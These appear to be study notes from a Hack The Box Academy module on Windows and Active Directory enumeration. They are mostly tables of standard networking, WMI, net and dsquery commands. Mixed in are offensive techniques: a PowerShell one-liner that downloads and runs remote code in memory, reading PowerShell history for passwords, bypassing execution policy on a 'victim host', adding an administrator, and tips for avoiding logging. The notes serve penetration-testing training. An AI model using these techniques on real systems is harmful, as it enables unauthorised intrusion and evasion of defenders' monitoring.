academy link: https://academy.hackthebox.com/module/143/section/1360

basic enumeration commands:

checking logged on users(powershell):
```powershell
qwinsta
```

| **Networking Commands**              | **Description**                                                                                                  |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |
try `systeminfo` first:

| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
| `systeminfo`                                            | gives most of all the output at once                                                       |

pure powershell:

| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |

> [!TIP]
> we can also downgrade powershell...below 3.0 powershell dont logs


#### Firewall checks:
from powershell:
```powershell
netsh advfirewall show allprofiles
```

from cmd:
```cmd
sc query windefend
```

if defender is running we can get more info about that from powershell:
```powershell
Get-MpComputerStatus
```

#### Quick WMI checks

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |
[cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) for wmiexec

#### net commands

|**Command**|**Description**|
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|

> [!tip]
> net commands are mostly logged..so use **net1** instread of **net**

#### Dsquery dll
we need some elevated privilages for this:
```powershell
dsquery user
dsquery computer
```
more in academy..same link which is in the starting.






